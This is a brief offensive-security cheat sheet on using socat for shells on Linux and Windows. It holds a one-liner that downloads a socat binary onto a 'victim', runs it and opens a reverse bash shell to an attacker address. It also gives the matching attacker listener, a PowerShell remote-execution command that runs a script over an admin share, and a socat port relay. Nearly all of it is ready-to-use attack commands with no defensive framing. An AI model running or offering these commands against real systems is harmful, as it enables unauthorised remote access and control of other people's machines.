# Socat Linux/Windows

## Linux <a id="linux"></a>

In case socat is not installed on the victim :

* Download socat :

`wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444`

* and set up a Listener on the attacker machine :

``socat file:`tty`,raw,echo=0 tcp-listen:4444``

## Windows <a id="windows"></a>

* Upload socat, create session, setup powercat

 `PS C:\modif> Invoke-Command -ScriptBlock{Invoke-Command -FilePath \\Server\C$\sh443.ps1 $Remote_Host} $jm`

`[Remote-Host]: PS C:\Users\admin\Desktop\\socat-1.7.3.2-1-i686> .\socat.exe -d -d TCP-LISTEN:443 TCP:192.168.50.96:443`

